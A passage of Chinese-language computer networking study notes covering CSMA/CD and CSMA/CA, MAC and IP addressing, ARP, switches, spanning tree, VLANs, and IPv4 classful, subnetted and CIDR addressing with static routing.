%}\n\n由图可以看出，当发生碰撞时，最长需要$2τ$的时间就能检测到本次是否发生碰撞（也就是碰撞点在最远端）。因此，以太网中，端到端的往返传播时延$2τ$称为争用期或碰撞窗口。也就是说在这段时间才有可能发生碰撞，若这段时间没有发生碰撞，则不再会发生碰撞。\n\n每一个主机在自己发送帧之后的一小段时间内，存在着遭遇碰撞的可能性。这一小段时间是不确定的。它取决于另一个发送帧的主机到本主机的距离，但不会超过总线的端到端往返传播时延，即一个争用期时间。\n\n显然，在以太网中发送帧的主机越多，端到端往返传播时延越大，发生碰撞的概率就越大。因此，共享式以太网不能连接太多的主机，使用的总线也不能太长。\n\n- 10Mb/s以太网把争用期定为 512 比特发送时间，即$51.2μs$，因此其总线长度不能超过 5120m，但考虑到其他一些因素，如信号衰减等，以太网规定总线长度不能超过 2500m。\n\n**最小帧长**\n\n{% asset_img 3.5.4.3.5.png 最小帧长 %}\n\nA站发送一个帧完毕后，不再针对该帧进行碰撞检测，而这时候C站检测到信道空闲时间 96 bit，发送帧，将产生碰撞。D站收到碰撞过后有差错的帧，将该帧丢弃。A站不知道已发送完毕的帧遭遇碰撞，所以不进行重传。显然，以太网的帧长不能太短！\n\n- 以太网规定最小帧长为64字节，即512比特（512比特时间即为争用期）\n  - 如果要发送的数据非常少，那么必须加入一些填充字节，使帧长不小于64字节。\n- 以太网的最小帧长确保了主机可在帧发送完成之前就检测到该帧的发送过程中是否遭遇了碰撞\n  - 如果在争用期（共发送64字节）没有检测到碰撞，那么后续发送的数据就一定不会发生碰撞；\n  - 如果在争用期内检测到碰撞，就立即中止发送，这时已经发送出去的数据一定小于64字节，因此凡长度小于64字节的帧都是由于碰撞而异常中止的无效帧。\n\n最小帧长的计算：\n$$\n最小帧长=争用期×数据传输速率\n$$\n**最大帧长**\n\n{% asset_img 3.5.4.3.6.png 最大帧长 %}\n\n在此传输情况中，A发送了一个很长的帧，占用了大量时间，造成B、C无法传输数据，并且可能会造成某一端的缓冲区满的情况。因此便提出了最大帧长的概念。\n\n**截断二进制指数退避算法**\n\n{% asset_img 3.5.4.3.7.png 截断二进制指数退避算法 %}\n\n**信道利用率**\n\n一般信道利用率：\n\n{% asset_img 3.5.4.3.8.png 一般信道利用率 %}\n\n极限信道利用率：\n\n{% asset_img 3.5.4.3.9.png 极限信道利用率 %}\n\n参数a的值尽量小，以提高信道利用率。因此以太网端到端的距离应受到限制，以太网帧的长度应尽量长些。\n\n**帧发送流程**\n\n{% asset_img 3.5.4.3.10.png 帧发送流程 %}\n\n**帧接收流程**\n\n{% asset_img 3.5.4.3.11.png 帧接收流程 %}\n\nCSMA/CD协议曾经用于各种总线结构以太网和双绞线以太网的早期版本中，现在的以太网基于交换机和全双工连接，不会有碰撞，因此没有必要使用CSMA/CD协议。\n\n{% asset_img 3.5.4.3.12.png 习题一 %}\n\n{% asset_img 3.5.4.3.13.png 习题二 %}\n\n{% asset_img 3.5.4.3.14.png 习题二 %}\n\n{% asset_img 3.5.4.3.15.png 习题二 %}\n\n#### 3.7.3.2 CSMA/CA协议\n\n载波监听多址接入/碰撞避免协议 CSMA/CA(Carrier Sense Multiple Access / Collosion Acoidance)\n\n{% asset_img 3.5.4.3.16.png 在无线网使用CSMA/CD协议 %}\n\n{% asset_img 3.5.4.3.17.png 在无线网使用CSMA/CD协议 %}\n\n{% asset_img 3.5.4.3.18.png 在无线网使用CSMA/CA协议 %}\n\n{% asset_img 3.5.4.3.19.png 帧间间隔 %}\n\n**CSMA/CA协议的工作原理**：\n\n{% asset_img 3.5.4.3.20.png CSMA/CA工作原理 %}\n\n1. 源站为什么在检测到信道空闲后还要再等待DIFS帧间间隔时间？\n\n   因为要考虑到可能有其它的站有高优先级的帧要发送。若有，就要让高优先级帧先发送。\n\n2. 目的站为什么正确接收数据帧后还要等待一段时间SIFS才能发送ACK帧？\n\n   SIFS是最短的帧间间隔，用来分隔属于一次对话的各帧。在这段时间内，一个站点应当能够从发送方式切换到接收方式。\n\n对于发送过程中其他信道检测到信道忙：\n\n{% asset_img 3.5.4.3.21.png 信道忙状态 %}\n\n{% asset_img 3.5.4.3.22.png 使用退避时间 %}\n\n{% asset_img 3.5.4.3.23.png 退避算法 %}\n\n{% asset_img 3.5.4.3.24.png 退避算法图解 %}\n\n**信道预约机制**：为了尽可能减少碰撞的概率和降低碰撞的影响，802.11标准允许要发送数据得站点对信道进行预约。\n\n对于一次信道预约要进行的过程：\n\n1. 源站在发送数据帧之前先发送一个短的控制帧，称为请求发送RTS(Request To Send)，它包括源地址、目的地址以及这次通信(包括相应的确认帧)所需的持续时间。\n2. 若目的站正确收到源站发来的RTS帧，且媒体空闲，就发送一个响应控制帧，称为允许发送CTS(Clear To Send)，它也包括这次通信所需的持续时间(从RTS帧中将此持续时间复制到CTS帧中)。\n3. 源站收到CTS帧后，再等待一段时间SIFS后，就可发送其数据帧。\n4. 若目的站正确收到了源站发来的数据帧，在等待时间SIFS后，就向源站发送确认帧ACK。\n\n{% asset_img 3.5.4.3.25.png  预约过程图解 %}\n\n{% asset_img 3.5.4.3.26.png  预约过程 %}\n\n**虚拟载波监听机制**：除RTS帧和CTS帧会携带通信需要持续的时间，数据帧也能携带通信需要持续的时间。\n\n{% asset_img 3.5.4.3.27.png  虚拟载波监听机制 %}\n\n此时，C知道信道将被占用多长时间，在这段时间内C不能发送帧，即A给B发送数据帧时不会受到C的干扰。\n\n{% asset_img 3.5.4.3.28.png  习题一 %}\n\n{% asset_img 3.5.4.3.29.png  习题二 %}\n\n## 3.8 MAC地址、IP地址及ARP协议\n\n- MAC地址是以太网的MAC子层所使用的地址，属于数据链路层。\n- IP地址是TCP/IP体系结构网际层所使用的地址。\n- ARP协议属于TCP/IP体系结构的网际层，其作用是已知设备所分配到的IP地址，使用ARP协议可以通过该IP地址获取到设备的MAC地址。\n\n### 3.8.1 MAC地址\n\n使用点对点信道的数据链路层不需要使用地址；使用广播信道的数据链路层必须使用地址来区分各主机。\n\n{% asset_img 3.8.1.1.png  MAC地址 %}\n\nMAC地址一般被固化在网卡(网络适配器)的电可擦可编程只读存储器(EEPROM)中，因此MAC地址也被称为硬件地址。MAC地址有时也被称为物理地址，但这并不意味着MAC地址属于网络体系结构中的物理层。\n\n{% asset_img 3.8.1.2.png  MAC地址 %}\n\n一般情况下，用户主机会包含两个网络适配器：有线局域网适配器(有线网卡)和无线局域网适配器(无线网卡)。每个网络适配器都有一个全球唯一的MAC地址。而交换机和路由器往往拥有更多的网络接口，所以会拥有更多的MAC地址。综上所述，MAC地址是对网络上各接口的唯一标识，而不是对网络上各设备的唯一标识。\n\n{% asset_img 3.8.1.3.png  MAC地址格式 %}\n\n{% asset_img 3.8.1.4.png  MAC地址格式 %}\n\n字节发送顺序：第一字节 -> 第六字节\n\n字节内比特发送顺序：$b_0$ ->  $b_7$\n\n**单播MAC地址举例**：\n\n{% asset_img 3.8.1.8.png  单播MAC地址 %}\n\n1. 主机B给主机C发送单播帧，主机B首先要构建该单播帧，在帧首部中的目的地址字段填入主机C的MAC地址，源地址字段填入自己的MAC地址，再加上帧首部的其他字段、数据载荷以及帧尾部，就构成了该单播帧。\n\n2. 将该帧发送给出去。\n\n   {% asset_img 3.8.1.9.png  单播MAC地址 %}\n\n3. 此时A接收该单播帧，发现该单播帧的目的MAC地址与自己的MAC地址不匹配，丢弃该帧；C接收该单播帧，发现该单播帧的目的MAC地址与自己的MAC地址匹配，接受该帧，并将该帧交给其上层处理。\n\n**广播MAC地址举例**：\n\n{% asset_img 3.8.1.10.png  广播MAC地址 %}\n\n1. 主机B首先要构建该广播帧，在帧首部中的目的地址字段填入广播地址，也就是十六进制的全F，源地址字段填入自己的MAC地址，再加上帧首部中的其他字段、数据载荷以及帧尾部，就构成了该广播帧。\n\n2. 发送该广播帧。\n\n   {% asset_img 3.8.1.11.png  广播MAC地址 %}\n\n3. 主机A和C都会收到该广播帧，发现该帧首部中的目的地址字段的内容是广播地址，就知道该帧是广播帧，主机A和主机C都接受该帧，并将该帧交给上层处理。\n\n**多播MAC地址举例**：\n\n主机A发送含有多播地址的多播帧，其他主机根据自己的多播组列表，判断是否接收帧。\n\n{% asset_img 3.8.1.12.png  多播MAC地址 %}\n\n主机A要发送多播帧给该多播地址。将该多播地址的左起第一个字节写成8个比特，第一个字节的最低比特位是1，表明该地址是多播地址。快速判断地址是不是多播地址，就是上图所示箭头所指的第十六进制数不能整除2（1,3,5,7,9,B,D,F），则该地址是多播地址。\n\n1. 构建该多播帧，在帧首部中的目的地址字段填入该多播地址，源地址字段填入自己的MAC地址，再加上帧首部中的其他字段、数据载荷以及帧尾部，就构成了该多播帧。\n\n2. 将该多播帧发送出去，主机B、C、D都会收到该多播帧，各用户给自己主机配置多播组列表如图所示：\n\n   {% asset_img 3.8.1.13.png  多播MAC地址 %}\n\n   可以看出主机B属于两个多播组，主机C也属于两个多播组，而主机D不属于任何多播组。\n\n   {% asset_img 3.8.1.14.png  多播MAC地址 %}\n\n3. 主机B和C发现该多播帧的目的MAC地址在自己的多播组列表中，主机B和C都会接受该帧。主机D发现该多播帧的目的MAC地址不在自己得多播组列表中，则丢弃该多播帧。\n\n### 3.8.2 IP地址\n\n{% asset_img 3.8.2.1.png  IP地址 %}\n\n{% asset_img 3.8.2.2.png  IP地址与MAC地址 %}\n\n{% asset_img 3.8.2.3.png  IP地址与MAC地址的变化情况 %}\n\n{% asset_img 3.8.2.4.png  IP地址与MAC地址的变化情况 %}\n\n### 3.8.3 ARP协议\n\nARP协议(地址解析协议)可以实现IP地址到MAC地址的相互转换。\n\n{% asset_img 3.8.3.2.png  ARP地址 %}\n\n在每一个主机中都有一个高速缓存表，可以记录IP地址和MAC地址的对应信息。\n\n{% asset_img 3.8.3.3.png  ARP高速缓存表 %}\n\n{% asset_img 3.8.3.4.png  ARP请求报文 %}\n\n{% asset_img 3.8.3.1.png  ARP请求报文 %}\n\n{% asset_img 3.8.3.5.png  ARP响应报文 %}\n\n{% asset_img 3.8.3.6.png  主机B保存C的MAC地址 %}\n\nARP的作用范围：逐段链路或逐个网络使用。\n\nARP没有安全验证机制，存在ARP欺骗(攻击)问题。\n\n## 3.9 集线器与交换机的区别\n\n早期的计算机网络中，常用的是总线型以太网。传统以太网最初是使用粗同轴电缆，后来演进到使用比较便宜的细同轴电缆，最后发展为使用更便宜和更灵活的双绞线。但是随着网络的发展被逐渐淘汰，出现了两种新型以太网结构：使用双绞线和集线器(HUB)的星型以太网、使用集线器(HUB)在物理层扩展以太网。\n\n### 3.9.1 使用双绞线和集线器HUB的星型以太网\n\n采用双绞线的以太网采用星型拓扑，在星型的中心则增加了一种可靠性非常高的设备，叫做集线器 (hub)。\n\n{% asset_img 3.9.1.1.png  使用双绞线和集线器HUB的星型以太网 %}\n\n集线器的以太网在逻辑上仍是个总线网，需要使用CSMA/CD协议来协调各主机争用总线，只能工作在半双工模式，收发帧不能同时进行。\n\n### 3.9.2 使用集线器(HUB)在物理层扩展以太网\n\n使用集线器扩展：将多个以太网段连成更大的、多级星型结构的以太网，会扩大广播域和碰撞域。\n\n{% asset_img 3.9.2.1.png  使用集线器(HUB)在物理层扩展以太网 %}\n\n### 3.9.3 以太网交换机\n\n以太网交换机是在数据链路层扩展以太网。\n\n{% asset_img 3.9.3.1.png  集线器与交换机 %}\n\n在集线器中，数据是以广播的形式发送，而在交换机中，会发送到目的主机，因此其效率要高很多。\n\n{% asset_img 3.9.3.2.png  以太网交换机 %}\n\n### 3.9.4 集线器与交换机的对比\n\n{% asset_img 3.9.4.1.png  集线器与交换机 %}\n\n1. 在单播情况下，集线器会像总线型一样把信号全部转发出去，而交换机只会发送给目标主机。\n2. 在广播情况下，二者无明显区别。\n\n当网络中多台主机同时给另一台主机发送单播帧，对于使用集线器的共享总线型以太网，必然会产生碰撞，遭遇碰撞的帧会传播到总线上的各主机；对于使用交换机的交换式以太网，交换机收到多个帧时，将它们缓存起来，然后逐个转发给目的主机，不会产生碰撞。\n\n{% asset_img 3.9.4.2.png  集线器与交换机 %}\n\n{% asset_img 3.9.4.3.png  集线器与交换机 %}\n\n{% asset_img 3.9.4.4.png  集线器与交换机 %}\n\n{% asset_img 3.9.4.5.png  集线器与交换机 %}\n\n## 3.10 以太网交换机自学习和转换帧的流程\n\n- 以太网交换机工作在数据链路层（也包括物理层）\n- 在以太网交换机中，有一个帧交换表。其中记录了帧的目的MAC地址对应的接口号。\n- 以太网交换机是一种即插即用设备，刚上电启动时其内部的帧交换表是空的。随着网络中各主机间的通信，以太网交换机通过自学习算法自动逐渐建立起帧交换表。\n\n{% asset_img 3.10.1.png  以太网交换机自学习和转换帧 %}\n\n每条记录都有自己的有效时间，到期自动删除。这是因为MAC地址与交换机接口的对应关系并不是永久性的，比如更换主机、更换网卡等导致MAC地址改变。\n\nPDU(Protocol Data Unit)的意思是协议数据单元，它是计算机网络体系结构中对等实体间逻辑通信的对象。\n\n以太网交换机工作在数据链路层(也包括物理层)，它接收并转发的PDU通常称为帧。以太网交换机收到帧后，在帧交换表中查找帧的目的MAC地址所对应的接口号，然后通过该接口转发帧。\n\n## 3.11 以太网交换机的生成树协议(STP)\n\n由于在实际使用过程中，可能会出现线路故障导致无法通信。若A与B之间的线路故障会导致B与A、C之间无法通信。\n\n{% asset_img 3.11.2.png  链路故障 %}\n\n{% asset_img 3.11.1.png  如何提高以太网的可靠性 %}\n\n以太网交换机使用生成树协议(Spanning Tree Protocol，STP)，可以在增加冗余链路来提高网络可靠性的同时又避免网络环路带来的各种问题。\n\n- 不论交换机之间采用怎样的物理连接，交换机都能够自动计算并构建一个逻辑上没有环路的网络，其逻辑拓扑结构必须是树型的(无逻辑环路)；\n- 最终生成的树型逻辑拓扑要确保连通整个网络；\n- 当首次连接交换机或网络物理拓扑发生变化时(有可能是人为改变或故障)，交换机都将进行生成树的重新计算。\n\n{% asset_img 3.11.3.png  生成树协议 %}\n\n## 3.12 虚拟局域网(VLAN)\n\n{% asset_img 3.12.1.png  巨大广播域带来的问题 %}\n\n广播风暴会浪费网络资源和各主机的CPU资源。\n\n{% asset_img 3.11.4.png  网络中频繁出现广播信息 %}\n\n{% asset_img 3.12.2.png  分割广播域的方法 %}\n\n虚拟局域网VLAN（Virtual Local Area Network）是一种将局域网内的设备划分成与物理位置无关的逻辑组的技术，这些逻辑组具有某些共同的需求。\n\n{% asset_img 3.12.3.png  划分虚拟局域网 %}\n\n### 3.12.1 VLAN的实现机制\n\n虚拟局域网VLAN技术是在交换机上实现的，需要交换机能够实现以下功能：\n\n- 能够处理带有VLAN标记的帧——IEEE 802.1Q帧\n- 交换机的各端口可以支持不同的端口类型，不同端口类型的端口对帧的处理方式有所不同\n\n#### 3.12.1.1 IEEE 802.1Q帧\n\n{% asset_img 3.12.4.png  IEEE 802.1Q帧 %}\n\n#### 3.12.1.2 交换机的端口类型\n\n- 交换机的端口类型有以下三种：\n  - Access\n  - Trunk\n  - Hybrid(思科交换机没有此端口)\n- 交换机各端口的缺省VLAN ID\n  - 在思科交换机上称为 Native VLAN，即本征VLAN。\n  - 在华为交换机上称为 Port VLAN ID，即端口VLAN ID，简记为PVID。\n\n##### 3.12.1.2.1 Access端口\n\nAccess端口主要用于交换机与用户计算机之间的互连。\n\n{% asset_img 3.12.5.png Access端口 %}\n\n对于VLAN的实现，可以通过划分VLAN后，修改Access端口的PVID：\n\n{% asset_img 3.12.6.png VLAN %}\n\n从而可以实现广播域的划分。\n\n##### 3.12.1.2.2 Trunk端口\n\n- Trunk端口一般用于交换机之间或交换机与路由器之间的互连。\n- Trunk端口可以属于多个VLAN。\n- 用户可以设置Trunk端口的PVID值。默认情况下，Trunk端口的PVID值为1。\n- Trunk端口发送处理方法：\n\n  - 对 VID等于PVID的帧，“去标签” 再转发\n\n  - 对 VID不等于PVID的帧，直接转发\n- Trunk端口接收处理方法：\n\n  - 接收 “未打标签” 的帧，根据接收帧的端口的PVID给帧 “打标签”，即插入4字节VLAN标记字段，字段中的VID取值与端口的PVID取值相等\n- 接收 “已打标签” 的帧\n\n{% asset_img 3.12.7.png Trunk端口 %}\n\n{% asset_img 3.12.8.png Trunk端口 %}\n\n##### 3.12.1.2.3 Hybrid端口\n\n{% asset_img 3.12.9.png Hybrid端口 %}\n\n# 4. 网络层\n\n## 4.1 网络层概述\n\n- 网络层的主要任务是实现网络互连，进而实现数据包在各网络之间的传输。\n- TCP/IP参考模型的网络层提供的是无连接、不可靠的数据报服务。\n- 要实现网络层任务，需要解决以下主要问题：\n  - 网络层向运输层提供怎样的服务（“可靠传输” 还是 “不可靠传输”）\n  - 网络层寻址问题\n  - 路由选择问题\n\n{% asset_img 4.1.1.png 互联网 %}\n\n每一个路由器都有一个路由表，路由表中记录了目的网络以及各级跳的路由器端口，以此来选择走哪个路由器到达端口。\n\n\n路由记录表的记录有两种情况生成：\n\n1. 由用户或网络管理员进行人工配置。这种方法只适用于规模较小且网络拓扑不改变的小型互联网。\n2. 实现各种路由选择协议，由路由器执行路由选择协议中所规定的路由选择算法，而自动得出路由表中的路由记录，这种方法更适合规模较大且网络拓扑经常改变的大型互联网。\n\n因特网是目前全世界用户数量最多的互联网，它使用TCP/IP协议栈。由于TCP/IP协议栈的网络层使用网际协议IP，它是整个协议栈的核心协议，因此在TCP/IP协议栈中网络层常称为网际层。\n\n{% asset_img 4.1.2.png TCP/IP协议栈 %}\n\n## 4.2 网络层提供的两种服务\n\n### 4.2.1 面向连接的虚电路服务\n\n- 可靠通信由网络来保证\n- 必须建立网络层的连接——虚电路VC(Virtual Circuit）\n- 通信双方沿着已建立的虚电路发送分组\n- 目的主机的地址仅在连接建立阶段使用，之后每个分组的首部只需携带一条虚电路的编号（构成虚电路的每一段链路都有一个虚电路编号）。\n- 这种通信方式如果再使用可靠传输的网络协议，就可使所发送的分组最终正确到达接收方（无差错按序到达、不丢失、不重复）\n- 通信结束后，需要释放之前所建立的虚电路。\n- 很多广域分组交换网都使用面向连接的虚电路服务。例如，曾经的X.25和逐渐过时的帧中继FR、异步传输模式ATM等。\n\n{% asset_img 4.2.1.png 面向连接的虚电路服务 %}\n\n### 4.2.2 面向无连接的数据报服务\n\n- 可靠通信应当由用户主机来保证\n- 不需要建立网络层连接\n- 每个分组可走不同的路径\n- 每个分组的首部必须携带目的主机的完整地址\n- 这种通信方式所传送的分组可能误码、丢失、重复和失序。\n- 由于网络本身不提供端到端的可靠传输服务，这就使网络中的路由器可以做得比较简单，而且价格低廉（与电信网的交换机相比较）。\n- 因特网采用了这种设计思想，也就是将复杂的网络处理功能置于因特网的边缘（用户主机和其内部的运输层），而将相对简单的尽最大努力的分组交付功能置于因特网核心。\n\n{% asset_img 4.2.2.png 面向无连接的数据报服务 %}\n\n{% asset_img 4.2.3.png 两种对比 %}\n\n## 4.3 IPv4地址\n\n### 4.3.1 IPv4地址概述\n\n- 在TCP/IP体系中，IP地址是一个最基本的概念，我们必须把它弄清楚。\n\n- IPv4地址就是给因特网（Internet）上的每一台主机（或路由器）的每一个接口分配一个在全世界范围内是唯一的32比特的标识符。\n\n- IP地址由因特网名字和数字分配机构ICANN(Internet Corporation for Assigned Names and Numbers)进行分配。\n\n  - 我国用户可向亚太网络信息中心APNIC(Asia Pacific Network Information Center)申请IP地址， 需要缴费。\n  - 2011年2月3日，互联网号码分配管理局IANA（由ICANN行使职能）宣布，IPv4地址已经分配完毕。\n  - 我国在2014至2015年也逐步停止了向新用户和应用分配IPv4地址。同时全面开展商用部署IPv6。\n\n- IPv4地址的编址方法经历了如下三个历史阶段：\n\n  {% asset_img 4.3.1.png IPv4三个历史阶段 %}\n\n- 32比特的IPv4地址不方便阅读、记录以及输入等，因此IPv4地址采用点分十进制表示方法以方便用户使用。\n\n  {% asset_img 4.3.2.png IPv4地址表示方法 %}\n\n### 4.3.2 分类编址的IPv4地址\n\n分类的IPv4地址共分为 5 类：A类地址、B类地址、C类地址、D类地址、E类地址。\n\n{% asset_img 4.3.3.png 分类编址的IPv4 %}\n\n#### 4.3.2.1 A类地址\n\n- 最小网络号 0，保留不指派\n- 第一个可指派的网络号为 1，网络地址为 1.0.0.0\n- 最大网络号 127，作为本地环回测试地址，不指派\n  - 最小的本地环回测试地址为 127.0.0.1\n  - 最大的本地环回测试地址为 127.255.255.254\n- 最后一个可指派的网络号为 126，网络地址为 126.0.0.0\n- 可指派的网络数量为 $2^{8-1}-2=126$（减2的原因是除去最小网络号0和最大网络号127）\n- 每个网络中可分配的IP地址数量为 $2^{24}- 2 = 16777214$（减2的原因是除去主机号为全 0 的网络地址和全 1 的广播地址）\n\n{% asset_img 4.3.4.png A类地址 %}\n\n#### 4.3.2.2 B类地址\n\n- 最小网络号也是第一个可指派的网络号 128.0\n  网络地址为 128.0.0.0\n- 最大网络号也是最后一一个可指派的网络号 191.255\n  网络地址为 191.255.0.0\n- 可指派的网络数量为 $2^{16-2}=16384$\n- 每个网络中可分配的IP地址数量为 $2^{16}-2=65534$（减2的原因是除去主机号为全 0 的网络地址和全1的广播地址）\n\n{% asset_img 4.3.5.png B类地址 %}\n\n#### 4.3.2.3 C类地址\n\n- 最小网络号也是第一个可指派的网络号 192.0.0\n  网络地址为 192.0.0.0\n- 最大网络号也是最后一一个可指派的网络号 223.255.255\n  网络地址为 223.255.255.0\n- 可指派的网络数量为 $2^{24-3}= 2097152$\n- 每个网络中可分配的IP地址数量为 $2^8-2=254$（减2的原因是除去主机号为全 0 的网络地址和全 1 的广播地址）\n\n{% asset_img 4.3.6.png C类地址 %}\n\n#### 4.3.2.4 一般不使用的特殊IP地址\n\n{% asset_img 4.3.7.png 一般不使用的特殊IP地址 %}\n\n### 4.3.3 划分子网的IPv4地址\n\n首先先明确为何要引出划分子网的概念：在 ARPANET 的早期，IP 地址的设计确实不够合理：\n\n1. IP 地址空间的利用率有时很低。\n2. 给每一个物理网络分配一个网络号会使路由表变得太大因而使网络性能变坏。\n3. 两级的 IP 地址不够灵活。\n\n例如：某一个大型局域网需要连接到因特网：\n\n{% asset_img 4.3.8.png 例子 %}\n\n- 此时由于C类地址不够存放所有主机，选择可分配主机数为65534个的B类地址，但是很明显此时会有很多主机地址没有被利用。\n- 但是对于剩余的IP地址只能由该单位的同一个网络使用，其他网络不得使用。\n\n随着单位的发展，该单位需要将原来的网络划分成三个独立的网络。此时只能选择为子网申请新的网络号，但是申请新的网络号会带来以下弊端：\n\n- 需要等待时间和花费更多的费用\n- 会增加其它路由器中路由表记录的数量\n- 浪费原有网络中剩余的大量IP地址\n\n因此提出了一种解决办法：从多余的主机号中借用一部分作为子网号，而不用申请新的网络地址。\n\n{% asset_img 4.3.9.png 例子 %}\n\n但是此时出现了一个新的问题：计算机要如何知道分类地址中有多少比特被用作子网号了呢？这就提出了一个子网掩码的概念。\n\n32bit子网掩码可以表明分类IP地址的主机号部分被借用了几个比特作为子网号。\n\n- 子网掩码用连续的比特1来对应网络号和子网号。\n- 子网掩码用连续的比特0来对应主机号。\n- 将划分子网的**IPv4地址**与其**相应的子网掩码进行逻辑与运算**就可以得到IPv4地址**所在的子网的网络地址**。\n\n{% asset_img 4.3.10.png 子网掩码计算 %}\n\n{% asset_img 4.3.11.png 习题一 %}\n\n{% asset_img 4.3.12.png 习题一 %}\n\n{% asset_img 4.3.13.png 默认子网掩码 %}\n\n### 4.3.4 无分类编址的IPv4地址\n\n划分子网在一定程度上缓解了因特网在发展中遇到的困难，但是数量巨大的C类网因为其地址（主机地址）空间太小没有得到充分使用，而因特网的IP地址仍在加速消耗，整个IPv4地址空间面临全部耗尽的威胁。\n\n因此因特网工程任务组IETF又提出了无分址编址方式来解决地址紧张的问题。\n\n1993年，IETF发布了无分类域间路由选择（Classless Inter-Domain Routing，CIDR），其主要的特点：\n\n- CIDR消除了传统的A类、B类和C类地址，以及划分子网的概念。\n- CIDR可以更加有效分配IPv4的地址空间（使地址空间分配不再被主机号所限制，做到自由的根据主机规模分配），并且可以在新的IPv6使用之前允许因特网的规模继续增长。\n- CIDR使用各种长度的网络前缀(network-prefix)来代替分类地址中的网络号和子网号。\n\nCIDR使用斜线记法，或称之为CIDR记法。即在IPv4地址前面加上斜线“/”，在斜线后面写上网络前缀所占比特数量（就是分类地址中的网络号和子网号）。\n\n{% asset_img 4.3.14.png 举例 %}\n\nCIDR实际上使将网络前缀都相同的连续IP地址组成一个“CIDR地址块”。我们只要知道CIDR地址块中的任何一个地址就可以知道该地址块的全部细节，例如：\n\n- 地址块的最小地址\n- 地址块的最大地址\n- 地址块中的地址数量\n- 地址块聚合某类网络(A类、B类、C类)的数量\n- 地址掩码(也可继续称为子网掩码)\n\n{% asset_img 4.3.15.png 举例 %}\n\n这里就出现了一个聚合的概念。其实聚合就是将多个小的网络连接起来，一起用一个大的网络分配给它们，向因特网只申请一个大的网络号，而不用申请多个小的网络号，因此形成了多个小网络聚合成一个大网络，减少了网络号的消耗。\n\n{% asset_img 4.3.16.png 路由聚合 %}\n\n### 4.3.5 IPv4地址的应用规划\n\nIPv4地址的应用规划考虑的是给定一个IPv4地址块，如何将其划分成几个更小的地址块（来满足多子网划分），并将这些地址块分配给互联网中不同网络，进而可以给各网络中的主机和路由器接口分配IPv4地址。\n\nIPv4的应用规划有两种：\n\n- 定长子网掩码（FLSM，Fixed Length Subnet Mask）\n\n  使用同一个子网掩码来划分子网\n\n  每个子网所分配的IP地址数量相同，造成IP地址浪费\n\n- 变长子网掩码（VLSM，Variable Length Subnet Mask）\n\n  使用不同的子网掩码来划分子网\n\n  每个子网所分配的IP地址数量可以不同，尽可能减少对IP地址的浪费\n\n{% asset_img 4.3.17.png 例子 %}\n\n{% asset_img 4.3.18.png 使用定长子网掩码划分子网 %}\n\n{% asset_img 4.3.19.png 使用定长子网掩码划分子网 %}\n\n{% asset_img 4.3.20.png 使用定长子网掩码划分子网 %}\n\n{% asset_img 4.3.21.png 使用变长子网掩码划分子网 %}\n\n在地址块的分配原则中，每个子块的起点位置不能随意选取，只能选取块整数倍的地址作为起点，也就是比特位置上$2^n$的位置。最好是先给大的子块分配子网。\n\n{% asset_img 4.3.22.png 使用变长子网掩码划分子网 %}\n\n## 4.4 IP数据报的发送和转发过程\n\nIP数据包的发送和转发过程包含两个部分：\n\n- 主机发送IP数据报\n\n  判断目的主机是否与自己在同一个网络：\n\n  - 若在同一个网络，则属于直接交付\n  - 若不在同一个网络，则属于间接交付，传输给主机所在网络的默认网关（路由器），由默认网关帮忙转发\n\n  {% asset_img 4.4.1.png 判断目的主机是否与自己在同一个网络 %}\n\n  {% asset_img 4.4.2.png 主机C如何知道路由器R的存在 %}\n\n- 路由器转发IP数据报\n\n  1. 检查IP数据报首部是否出错：\n     - 若出错，则直接丢弃该IP数据报并告诉源主机\n     - 若没有出错，则进行转发\n  2. 根据IP数据报的目的地址在路由表中查找匹配的条目：\n     - 若找到匹配的条目，则转发给条目中指示的下一跳\n     - 若找不到，则丢弃该IP数据报并告诉源主机\n\n  {% asset_img 4.4.3.png 在路由表中查找匹配的条目 %}\n\n  {% asset_img 4.4.4.png 路由器隔离广播域 %}\n\n{% asset_img 4.4.5.png 习题一 %}\n\n{% asset_img 4.4.6.png 习题二 %}\n\n## 4.5 静态路由配置及其可能产生的路由环路问题\n\n静态路由配置是指用户或网络管理员使用路由器的相关命令给路由器人工配置路由表。\n\n- 这种人工配置方式简单、开销小。但不能及时适应网络状态(流量、拓扑等)的变化。\n- 一般只在小规模网络中采用。\n\n使用静态路由配置可能出现以下问题导致产生路由环路的错误。\n\n- 配置错误\n- 聚合了不存在的网络\n- 网络故障\n\n{% asset_img 4.4.7.png 静态路由配置 %}\n\n对于有多个网络存在时，如连接到因特网，对每个网络都进行静态配置显然是不现实的，因此就引出了默认路由的概念。\n\n{% asset_img 4.4.8.png 默认路由 %}\n\n{% asset_img 4.4.9.png 特定主机路由 %}\n\n静态路由配置错误导致路由环路问题：\n\n{% asset_img 4.4.10.png 静态路由配置错误导致路由环路 %}\n\n聚合了不存在的网络而导致路由环路问题：\n\n{% asset_img 4.4.11.png 路由聚合 %}\n\n{% asset_img 4.4.12.png 聚合了不存在的网络而导致路由环路 %}\n\n{% asset_img 4.4.13.png 聚合了不存在的网络而导致路由环路 %}\n\n网络故障而导致路由环路问题：\n\n假设路由器R1检测到其接口0所直连的网络出现了故障而不可达，就会自动在其路由表中删除该直连网络的路由条目。\n\n{% asset_img 4.4.14.png 网络故障而导致路由环路 %}\n\n{% asset_img 4.4.15.png 网络故障而导致路由环路 %}\n\n假设一段时间后，之前的故障被修复好了，则R1又自动地得出了其接口0的直连网络的路由条目，并将之前人工配置的针对该直连网络的黑洞路由条目设置为失效状态。假设该直连网络又出现故障而不可达，就会自动在其路由表中删除该直连网络的路由条目，并将该直连网络的黑洞路由条目设置为生效状态。\n\n## 4.6 路由选择协议\n\n### 4.6.1 路由选择协议概述\n\n路由器的选择协议分为两种：静态路由选择和动态路由选择。\n\n| 静态路由选择                                                 | 动态路由选择                                        |\n| ------------------------------------------------------------ | --------------------------------------------------- |\n| 由人工配置的网络路由、默认路由、特定主机路由、黑洞路由等都属于静态路由 | 路由器通过路由选择协议自动获取路由信息              |\n| 这种人工配置方式简单、开销小<br/>但是不能及时适应网络状态（流量、拓扑等）的变化 | 比较复杂、开销比较大<br/>能较好的适应网络状态的变化 |\n| 一般只在小规模网络中采用                                     | 适用于大规模网络                                    |\n\n因特网所采用的路由选择协议的主要特点：\n\n1. 自适应：采用动态路由选择，能较好的适应网络状态的变化\n2. 分布式：路由器之间通过相互之间的信息交互，交换路由信息\n3. 分层次：将整个因特网划分为许多较小的自治系统AS（Autonomous 